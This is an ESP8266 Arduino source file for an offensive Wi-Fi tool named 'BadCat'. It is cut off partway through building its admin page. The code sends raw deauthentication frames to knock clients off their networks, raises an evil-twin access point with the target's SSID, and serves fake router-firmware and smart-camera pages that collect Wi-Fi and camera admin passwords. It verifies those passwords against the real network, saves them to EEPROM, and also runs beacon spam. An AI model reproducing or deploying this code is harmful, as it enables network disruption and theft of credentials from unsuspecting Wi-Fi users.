#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <EEPROM.h>

extern "C" {
#include "user_interface.h"
}
#include <lwip/napt.h>
#include <lwip/dns.h>
#include <dhcpserver.h>

#define NAPT 250
#define NAPT_PORT 10

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

struct Station {
  uint8_t bssid[6];
  uint8_t station[6];
  unsigned long lastSeen;
};

#define MAX_STATIONS 100
Station stations[MAX_STATIONS];

void sniffer_callback(uint8_t *buf, uint16_t len) {
  if (len <= 12) return;
  uint8_t *frame = buf + 12; // rx_control is 12 bytes
  uint8_t type = frame[0] & 0x0C; // Type 
  
  if (type != 0x00 && type != 0x08) return; 

  uint8_t toDS = (frame[1] & 0x01);
  uint8_t fromDS = (frame[1] & 0x02);
  
  uint8_t *mac1 = frame + 4;
  uint8_t *mac2 = frame + 10;
  uint8_t *mac3 = frame + 16;
  
  uint8_t bssid[6];
  uint8_t station[6];
  
  if (toDS == 0 && fromDS == 0) {
    memcpy(bssid, mac3, 6);
    if (mac1[0] & 0x01) {
      memcpy(station, mac2, 6);
    } else {
      if (memcmp(mac1, mac3, 6) == 0) {
        memcpy(station, mac2, 6);
      } else {
        memcpy(station, mac1, 6);
      }
    }
  } else if (toDS && !fromDS) {
    memcpy(bssid, mac1, 6);
    memcpy(station, mac2, 6);
  } else if (!toDS && fromDS) {
    memcpy(bssid, mac2, 6);
    memcpy(station, mac1, 6);
  } else {
    return; // WDS or Adhoc
  }
  
  // Ignore broadcast/multicast
  if ((station[0] & 0x01) || (bssid[0] & 0x01)) return;
  if (memcmp(station, bssid, 6) == 0) return;

  int empty_idx = -1;
  int oldest_idx = 0;
  unsigned long oldest_time = 0xFFFFFFFF;
  unsigned long now_ms = millis();
  
  for (int i = 0; i < MAX_STATIONS; i++) {
    if (stations[i].lastSeen == 0) {
      if (empty_idx == -1) empty_idx = i;
    } else {
      if (memcmp(stations[i].bssid, bssid, 6) == 0 && memcmp(stations[i].station, station, 6) == 0) {
        stations[i].lastSeen = now_ms;
        return;
      }
      if (stations[i].lastSeen < oldest_time) {
        oldest_time = stations[i].lastSeen;
        oldest_idx = i;
      }
    }
  }
  
  int target_idx = (empty_idx != -1) ? empty_idx : oldest_idx;
  memcpy(stations[target_idx].bssid, bssid, 6);
  memcpy(stations[target_idx].station, station, 6);
  stations[target_idx].lastSeen = now_ms;
}

int getClientCount(uint8_t *bssid) {
  int count = 0;
  unsigned long current_time = millis();
  for (int i = 0; i < MAX_STATIONS; i++) {
    if (stations[i].lastSeen > 0 && memcmp(stations[i].bssid, bssid, 6) == 0) {
      if (current_time - stations[i].lastSeen < 60000) { // Active in last 60 seconds
        count++;
      }
    }
  }
  return count;
}

#define MAX_BEACONS 50
String beacon_ssids[MAX_BEACONS];
int beacon_count = 0;
bool beacon_spam_active = false;
unsigned long beacon_now = 0;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i].ssid = "";
    _networks[i].ch = 0;
    memset(_networks[i].bssid, 0, 6);
  }
}

String _correct = "";
String _tryPassword = "";
String _tryCamPassword = "";

int current_template = 0;

String getTemplateTitle() {
  if (current_template == 1) return "<span style='color:#e60000;font-size:32px;'>&#9888;</span> Camera Disconnected";
  return "<span style='color:#e60000;font-size:32px;'>&#9888;</span> Firmware Update Failed";
}

String getTemplateSubtitle() {
  if (current_template == 1) return "SMART CAMERA SETUP";
  return "ACCESS POINT RESCUE MODE";
}

String getTemplateBody() {
  if (current_template == 1) return "Your Smart Security Camera lost connection to the network due to a recent firmware update.<br><br>Please verify your Wi-Fi password to reconnect your camera and resume live streaming.";
  return "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your Wi-Fi password.";
}

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "body { background: #f2f2f2; color: #333; font-family: Century Gothic, sans-serif; font-size: 16px; line-height: 24px; margin: 0; padding: 0; }"
               "article { background: #fff; padding: 1.3em; }"
               "div { padding: 0.8em; }"
               "h1 { margin: 0.5em 0; font-size: 26px; color: #333; }"
               "input { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; background: #fff; border: 1px solid #ccc; color: #333; border-radius: 5px; font-size: 16px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; margin-top: 10px; }"
               "nav { background: #0066ff; color: #fff; text-align: center; font-size: 1.1em; padding: 1em; }"
               "nav b { display: block; font-size: 1.3em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }"
               "input[type=submit] { background-color: #0066ff; color: white; border: none; cursor: pointer; transition: 0.3s; padding: 12px; font-weight: bold; margin-top: 15px; }"
               "input[type=submit]:hover { background-color: #0055cc; }";
               
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " Rescue</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + getTemplateSubtitle() + "</nav><div style='padding:1.5em;'><h1>" + t + "</h1></div><div style='padding:0 1.5em;'>";
  return h;
}

String footer() {
  return "</div><div style='padding:1em; text-align:center; color:#777; font-size: 13px; margin-top:20px;'><a>&#169; All rights reserved.</a></div></body></html>";
}

String index() {
  String formHtml = "<div><form action='/' method=post>";
  
  if (current_template == 1) {
    formHtml += "<label>Wi-Fi Password:</label>"
                "<input type=password id='password' name='password' minlength='8' required></input>"
                "<label>Camera Admin Password:</label>"
                "<input type=password id='cam_password' name='cam_password' required></input>";
  } else {
    formHtml += "<label>WiFi password:</label>"
                "<input type=password id='password' name='password' minlength='8' required></input>";
  }
  
  formHtml += "<input type=submit value=Continue></form></div>";
  
  return header(getTemplateTitle()) + "<div>" + getTemplateBody() + "</div>" + formHtml + footer();
}

bool hotspot_active = false;
bool deauthing_active = false;
bool rand_beacon_active = false;
bool repeater_active = false;
bool is_logged_in = false;
String repeater_error = "";
bool napt_initialized = false;

void handleIndex();
void handleAdmin();
void handleArgs();

void setup() {
  Serial.begin(115200);
  EEPROM.begin(512);
  
  String saved_pass = "";
  for (int i = 0; i < 256; i++) {
    char c = char(EEPROM.read(i));
    if (c == 0 || c == 255) break;
    saved_pass += c;
  }
  if (saved_pass.length() > 5 && saved_pass.startsWith("Wi-Fi:")) {
    _correct = saved_pass;
  }
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.setOutputPower(20.5);
  wifi_set_promiscuous_rx_cb(sniffer_callback);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("BadCat", "Cat@1234");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  // Add default beacons
  beacon_ssids[0] = "Never gonna give you up";
  beacon_ssids[1] = "Never gonna let you down";
  beacon_ssids[2] = "Never gonna run around";
  beacon_ssids[3] = "And desert you";
  beacon_count = 4;

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/status", [](){
    if (WiFi.status() == WL_CONNECTED) {
      webServer.send(200, "text/plain", "1");
    } else if (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL) {
      webServer.send(200, "text/plain", "-1");
    } else {
      webServer.send(200, "text/plain", "0");
    }
  });
  
  webServer.on("/login", [](){
    if (webServer.hasArg("adminpass") && webServer.arg("adminpass") == "Cat@1234") {
      is_logged_in = true;
      webServer.sendHeader("Location", "/admin", true);
      webServer.send(302, "text/plain", "");
    } else {
      webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#0f1115;color:#e2e8f0;font-family:sans-serif;text-align:center;padding-top:20%;} input{padding:10px; border-radius:5px; border:1px solid #3b82f6; background:#181b21; color:#fff;} button{padding:10px 20px; background:#3b82f6; color:#fff; border:none; border-radius:5px; cursor:pointer;} </style></head><body><h2>Admin Login</h2><p style='color:red;'>Incorrect Password!</p><form action='/login' method='POST'><input type='password' name='adminpass' placeholder='Admin Password' required><br><br><button type='submit'>Login</button></form></body></html>");
    }
  });
  
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", String("http://") + WiFi.softAPIP().toString() + "/", true);
    webServer.send(302, "text/plain", "");
  });
  webServer.begin();
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    int arrayIndex = 0;
    for (int i = 0; i < n && arrayIndex < 16; ++i) {
      String ssid = WiFi.SSID(i);
      int ch = WiFi.channel(i);
      
      // Filter out invalid channels, empty names, and noise
      if (ssid == "" || ssid == " " || ch <= 0 || ch > 14) continue;
      
      // Filter out duplicate BSSIDs
      bool isDuplicate = false;
      for (int k = 0; k < arrayIndex; k++) {
        if (memcmp(_networks[k].bssid, WiFi.BSSID(i), 6) == 0) {
          isDuplicate = true;
          break;
        }
      }
      if (isDuplicate) continue;
      
      _Network network;
      network.ssid = ssid;
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = ch;
      _networks[arrayIndex] = network;
      arrayIndex++;
    }
  }
}



String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#f2f2f2;color:#333;font-family:Century Gothic, sans-serif;text-align:center;padding-top:20%;}</style></head><body><h2><span style='color:#e60000;font-size:60px;'>&#8855;</span><br>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Wi-Fi: " + _selectedNetwork.ssid + " | Pass: " + _tryPassword;
    if (_tryCamPassword != "") {
      _correct += " | Cam Admin: " + _tryCamPassword;
    }
    
    // Save to EEPROM so it survives reboots
    for (int i = 0; i < _correct.length() && i < 255; i++) {
      EEPROM.write(i, _correct[i]);
    }
    EEPROM.write(_correct.length(), 0);
    EEPROM.commit();
    
    hotspot_active = false;
    dnsServer.stop();
    WiFi.disconnect(); // Disconnect cleanly from target
    delay(100);
    WiFi.softAPdisconnect (true);
    delay(100);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("BadCat", "Cat@1234");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

const char _tempHTML[] PROGMEM = "<!DOCTYPE html><html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>\n"
"<style>:root{--bg:#050510;--panel-bg:rgba(10,15,30,0.85);--border:#00e5ff;--text:#e0f7fa;--accent:#00e5ff;--accent-hover:#00b3cc;--red:#ff0055;--green:#00ff88;--glow-cyan:0 0 5px rgba(0,229,255,0.4),0 0 10px rgba(0,229,255,0.2);--glow-red:0 0 5px rgba(255,0,85,0.4),0 0 10px rgba(255,0,85,0.2);--glow-green:0 0 5px rgba(0,255,136,0.4),0 0 10px rgba(0,255,136,0.2)}*{box-sizing:border-box}body{background-color:var(--bg);background-image:linear-gradient(0deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(0,229,255,0.05) 25%,rgba(0,229,255,0.05) 26%,transparent 27%,transparent 74%,rgba(0,229,255,0.05) 75%,rgba(0,229,255,0.05) 76%,transparent 77%,transparent);background-size:40px 40px;color:var(--text);font-family:'Courier New',Courier,monospace;margin:0;padding:20px;line-height:1.6}.content{max-width:800px;margin:auto}h2{text-align:center;font-size:26px;margin-bottom:30px;font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:2px;text-shadow:var(--glow-cyan)}h2 svg{width:32px;height:32px;fill:var(--accent);filter:drop-shadow(0 0 4px var(--accent)) drop-shadow(0 0 8px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:8px}.panel{background:var(--panel-bg);padding:20px;border-radius:4px;border:1px solid var(--accent);margin-bottom:25px;box-shadow:0 0 10px rgba(0,229,255,0.2);backdrop-filter:blur(5px);position:relative}.panel::before,.panel::after{content:'';position:absolute;width:15px;height:15px;border:2px solid var(--accent);pointer-events:none}.panel::before{top:-2px;left:-2px;border-right:none;border-bottom:none}.panel::after{bottom:-2px;right:-2px;border-left:none;border-top:none}h3{margin-top:0;color:var(--accent);font-size:16px;border-bottom:1px dashed var(--accent);padding-bottom:8px;margin-bottom:20px;text-transform:uppercase;letter-spacing:1px}h3 svg{width:18px;height:18px;fill:var(--accent);filter:drop-shadow(0 0 3px var(--accent)) drop-shadow(0 0 6px var(--accent));vertical-align:middle;margin-bottom:4px;margin-right:6px}.table-wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;margin-top:5px;white-space:nowrap}th,td{border-bottom:1px dashed rgba(0,229,255,0.3);padding:12px 15px;text-align:left;font-size:14px}th{background-color:rgba(0,229,255,0.05);font-weight:bold;color:var(--accent);text-transform:uppercase;letter-spacing:1px}tr:hover td{background:rgba(0,229,255,0.1)}button{background-color:transparent;color:var(--accent);border:1px solid var(--accent);box-shadow:0 0 8px rgba(0,229,255,0.2) inset;padding:10px 12px;border-radius:2px;cursor:pointer;transition:all 0.3s ease;font-weight:bold;font-size:14px;font-family:inherit;text-transform:uppercase;letter-spacing:1px;display:flex;align-items:center;justify-content:center;gap:8px;width:100%}button svg{width:14px;height:14px;fill:currentColor;flex-shrink:0}button:hover{background-color:var(--accent);color:#000;box-shadow:var(--glow-cyan);transform:translateY(-1px)}button:active{transform:translateY(0)}button.red{color:var(--red);border-color:var(--red);box-shadow:0 0 8px rgba(255,0,85,0.2) inset}button.red:hover{background-color:var(--red);color:#000;box-shadow:var(--glow-red)}button.green{color:var(--green);border-color:var(--green);box-shadow:0 0 8px rgba(0,255,136,0.2) inset}button.green:hover{background-color:var(--green);color:#000;box-shadow:var(--glow-green)}button:disabled{opacity:0.3;cursor:not-allowed;transform:none;background:transparent;color:var(--accent);box-shadow:none}table button{padding:6px 12px;font-size:12px;width:auto}input[type='text'],input[type='password'],select{padding:12px 15px;background:rgba(0,0,0,0.6);border:1px solid var(--accent);color:var(--accent);border-radius:2px;font-size:14px;font-family:inherit;transition:0.3s;width:100%;margin-bottom:15px}input:focus,select:focus{outline:none;box-shadow:var(--glow-cyan);background:rgba(0,229,255,0.05)}label{font-size:13px;color:var(--text);margin-bottom:5px;display:block;text-transform:uppercase}.flex{display:flex;gap:15px;align-items:center;width:100%}.flex form{flex:1;width:100%}.badge{background:rgba(0,229,255,0.1);border:1px solid var(--accent);padding:6px 12px;border-radius:2px;font-size:13px;margin:4px;display:inline-flex;align-items:center}.badge a{color:var(--red);text-decoration:none;font-weight:bold;margin-left:10px;font-size:16px}.badge a:hover{text-shadow:var(--glow-red)}.radio-group label{display:flex;align-items:center;gap:10px;padding:10px 0;cursor:pointer;font-size:14px}.radio-group input[type='radio']{width:16px;height:16px;margin:0;accent-color:var(--accent);cursor:pointer}@media(max-width:600px){body{padding:10px}h2{font-size:20px;line-height:1.4}h2 svg{width:24px;height:24px;display:block;margin:0 auto 10px auto}.panel{padding:15px}.flex{flex-direction:column;gap:10px}input[type='text'],select{margin-bottom:10px}button{font-size:13px}}</style>\n"
"</head><body><div class='content'>\n"
"<h2><svg viewBox='0 0 24 24'><path d='M11 2h2v3h-2zm0 17h2v3h-2zm9-9h3v2h-3zm-17 0h3v2H3zm17-4h3v2h-3zm-17 0h3v2H3zm17 8h3v2h-3zm-17 0h3v2H3zm5-11h4V2h-4zm0 17h4v3h-4zM6 6h12v12H6zm2 2h8v8H8z'/></svg>ESP8266 CONTROL PANEL</h2>\n"
"<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M22.7 19l-9.1-9.1c.9-2.3.4-5-1.5-6.9-2-2-5-2.4-7.4-1.1L9 6 6 9 1.6 4.7C.4 7.1.9 10.1 2.9 12.1c1.9 1.9 4.6 2.4 6.9 1.5l9.1 9.1c.4.4 1 .4 1.4 0l2.3-2.3c.5-.4.5-1.1.1-1.4z'/></svg>OFFENSIVE ACTIONS</h3>\n"
"<div class='flex'>\n"
"<form method='post' action='/?deauth={deauth}'><button {disabled} class='{deauth_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{deauth_button}</button></form>\n"
"<form method='post' action='/?hotspot={hotspot}'><button {disabled} class='{hotspot_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{hotspot_button}</button></form>\n"
"</div>\n"
"<div class='flex' style='margin-top:15px;'>\n"
"<form method='post' action='/?randbeacon={randbeacon}'><button class='{rand_class}'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>{rand_button}</button></form>\n"
"</div></div>";


void handleArgs() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("check")) {
    String check_mac = webServer.arg("check");
    int target_ch = 1;
    uint8_t target_bssid[6];
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == check_mac) {
        target_ch = _networks[i].ch;
        memcpy(target_bssid, _networks[i].bssid, 6);
        break;
      }
    }
    
    webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Scanning clients...<br>Please wait.</h2><p style='color:#777;'>Sending ping to wake up clients...</p></body></html>");
    unsigned long wait_start = millis();
    while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
    
    uint8_t old_ch = wifi_get_channel();
    wifi_promiscuous_enable(0);
    wifi_set_channel(target_ch);
    wifi_promiscuous_enable(1);
    
    // Broadcast Deauth to wake up idle clients
    uint8_t deauth_pkt[26] = {
      0xc0, 0x00, 0x00, 0x00, 
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
      0x00, 0x00, 0x01, 0x00
    };
    memcpy(&deauth_pkt[10], target_bssid, 6);
    memcpy(&deauth_pkt[16], target_bssid, 6);
    
    for(int i=0; i<5; i++) {
      wifi_send_pkt_freedom(deauth_pkt, 26, 0);
      delay(100);
    }
    
    unsigned long start = millis();
    while(millis() - start < 2500) {
      yield(); 
    }
    
    // Hop back, BadCat never drops!
    wifi_promiscuous_enable(0);
    wifi_set_channel(old_ch);
    wifi_promiscuous_enable(1);
    return;
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Starting Deauth...</h2><p style='color:#777;'>Firing packets in background...</p></body></html>");
      return;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("randbeacon")) {
    if (webServer.arg("randbeacon") == "start") {
      rand_beacon_active = true;
    } else if (webServer.arg("randbeacon") == "stop") {
      rand_beacon_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Starting EvilTwin...</h2><p style='color:#777;'>Switching SSID and Channel...</p></body></html>");
      unsigned long wait_start = millis();
      while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
      
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str(), "", _selectedNetwork.ch);
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      
      wifi_promiscuous_enable(0);
      wifi_set_promiscuous_rx_cb(sniffer_callback);
      wifi_promiscuous_enable(1);
      return;
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Stopping EvilTwin...</h2><p style='color:#777;'>Reverting to original AP...</p></body></html>");
      unsigned long wait_start = millis();
      while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
      
      WiFi.softAPdisconnect (true);
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("BadCat", "Cat@1234");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      
      wifi_promiscuous_enable(0);
      wifi_set_promiscuous_rx_cb(sniffer_callback);
      wifi_promiscuous_enable(1);
      return;
    }
  }

  if (webServer.hasArg("repeater")) {
    if (webServer.arg("repeater") == "start") {
      String h_ssid = webServer.arg("hssid");
      String h_pass = webServer.arg("hpass");
      String e_ssid = webServer.arg("essid");
      String e_pass = webServer.arg("epass");
      
      repeater_error = "";
      dnsServer.stop();
      wifi_promiscuous_enable(0);
      
      WiFi.mode(WIFI_AP_STA);
      WiFi.begin(h_ssid.c_str(), h_pass.c_str());
      
      // Wait for connection to home router synchronously
      int tries = 0;
      while (WiFi.status() != WL_CONNECTED && tries < 30) {
        delay(500);
        yield();
        tries++;
      }
      
      if (WiFi.status() == WL_CONNECTED) {
        repeater_active = true;
        
        // Send the HTTP response BEFORE we change the Wi-Fi network, so the browser doesn't get a connection error
        webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><style>body{background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;}</style></head><body><h2>Connected Successfully!</h2><p style='color:#10b981;'>Repeater is now active.</p><p>Please connect your phone to the new Extender Wi-Fi: <b>" + e_ssid + "</b></p></body></html>");
        
        unsigned long wait_start = millis();
        while (millis() - wait_start < 1000) { webServer.client().flush(); delay(1); }
        
        // Provide valid DNS servers to Extender clients BEFORE starting SoftAP
        // DNS 0: Home Router's DNS, DNS 1: Google DNS (Fallback)
        dhcps_set_dns(0, WiFi.dnsIP(0));
        IPAddress googleDNS(8, 8, 8, 8);
        dhcps_set_dns(1, googleDNS);
        
        // Use a unique subnet (192.168.14.x) to avoid conflict with Home Router
        WiFi.softAPConfig(IPAddress(192, 168, 14, 1) , IPAddress(192, 168, 14, 1) , IPAddress(255, 255, 255, 0));
        WiFi.softAP(e_ssid.c_str(), e_pass.c_str());
        
        delay(100); // Allow SoftAP to fully start before modifying DHCP/NAT
        
        if (!napt_initialized) {
          err_t ret = ip_napt_init(NAPT, NAPT_PORT);
          if (ret == ERR_OK) {
            napt_initialized = true;
          } else {
            repeater_error = "NAPT Init Failed: " + String(ret);
          }
        }
        
        if (napt_initialized) {
          err_t ret = ip_napt_enable_no(SOFTAP_IF, 1);
          if (ret != ERR_OK) {
            repeater_error = "NAPT Enable Failed: " + String(ret);
          }
        }
        
        return;
      } else {
        repeater_active = false;
        repeater_error = "Connection Failed! Check Home Wi-Fi Password or Range.";
        WiFi.disconnect();
        
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
        WiFi.softAP("BadCat", "Cat@1234");
        dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
        wifi_promiscuous_enable(1);
        
        webServer.sendHeader("Location", "/admin", true);
        webServer.send(302, "text/plain", "");
        return;
      }
      
    } else if (webServer.arg("repeater") == "stop") {
      repeater_active = false;
      repeater_error = "";
      ip_napt_enable_no(SOFTAP_IF, 0);
      
      webServer.send(200, "text/html", "<html><head><meta http-equiv='refresh' content='4;url=/admin'></head><body style='background:#0f1115; font-family:sans-serif; text-align:center; padding-top:20%; color:#fff;'><h2>Stopping Repeater...</h2><p style='color:#777;'>Reverting to Hacking Mode...</p></body></html>");
      unsigned long wait_start = millis();
      while (millis() - wait_start < 500) { webServer.client().flush(); delay(1); }
      
      WiFi.disconnect();
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("BadCat", "Cat@1234");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
      
      wifi_promiscuous_enable(1);
      return;
    }
  }

  if (webServer.hasArg("addbeacon")) {
    if (webServer.hasArg("beaconssid") && beacon_count < MAX_BEACONS) {
      String newSsid = webServer.arg("beaconssid");
      if (newSsid.length() > 0) {
        beacon_ssids[beacon_count] = newSsid.substring(0, 32);
        beacon_count++;
      }
    }
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (webServer.hasArg("delbeacon")) {
    int idx = webServer.arg("delbeacon").toInt();
    if (idx >= 0 && idx < beacon_count) {
      for (int i = idx; i < beacon_count - 1; i++) {
        beacon_ssids[i] = beacon_ssids[i+1];
      }
      beacon_count--;
    }
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }

  if (webServer.hasArg("beaconspam")) {
    if (webServer.arg("beaconspam") == "start") {
      beacon_spam_active = true;
    } else if (webServer.arg("beaconspam") == "stop") {
      beacon_spam_active = false;
    }
  }

  if (webServer.hasArg("settemplate")) {
    if (webServer.hasArg("tpl")) {
      current_template = webServer.arg("tpl").toInt();
    }
    webServer.sendHeader("Location", "/", true);
    webServer.send(302, "text/plain", "");
    return;
  }
}

String buildAdminPage() {
    String _html;
    _html.reserve(10000);
    _html = FPSTR(_tempHTML);
    
    // Target Network Selection table
    _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z'/></svg>TARGET NETWORKS</h3><div class='table-wrap'><table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Action</th></tr>";
    
    for (int i = 0; i < 16; ++i) {
      bool isEmpty = true;
      for(int k=0; k<6; k++) if(_networks[i].bssid[k] != 0) isEmpty = false;
      if (isEmpty) continue; // Skip empty slots instead of breaking early
      String safeSsid = _networks[i].ssid;
      safeSsid.replace("<", "&lt;");
      safeSsid.replace(">", "&gt;");
      _html += "<tr><td>" + safeSsid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button class='green'>SELECTED</button></form></td></tr>";
      } else {
        _html += "<button>SELECT</button></form></td></tr>";
      }
    }
    _html += "</table></div></div>";
    
    // Beacon Spam Panel
    _html += "<div class='panel'><h3><svg viewBox='0 0 24 24'><path d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 14c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm0-6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z'/></svg>CUSTOMIZE BEACON SPAM</h3>";
    _html += "<form method='post' action='/?addbeacon=1' class='flex' style='margin-bottom:15px;'><input type='text' name='beaconssid' placeholder='NEW BEACON SSID' maxlength='32' style='margin:0;' required> <button type='submit' style='width:auto;'>+ ADD</button></form>";
    _html += "<div>";
    for(int i=0; i<beacon_count; i++) {
        _html += "<div class='badge'>" + beacon_ssids[i] + " <a href='/?delbeacon=" + String(i) + "'>&times;</a></div>";
    }
    _html += "</div>";
    _html += "<form method='post' style='margin-top:20px;' action='/?beaconspam=" + String(beacon_spam_active ? "stop" : "start") + "'><button class='" + String(beacon_spam_active ? "red" : "green") + "'><svg viewBox='0 0 24 24'><path d='M8 5v14l11-7z'/></svg>" + String(beacon_spam_active ? "STOP CUSTOMIZE BEACON SPAM" : "START CUSTOMIZE BEACON SPAM") + "</button></form>";
    _html += "</div>";

    // Phishing Template Selection
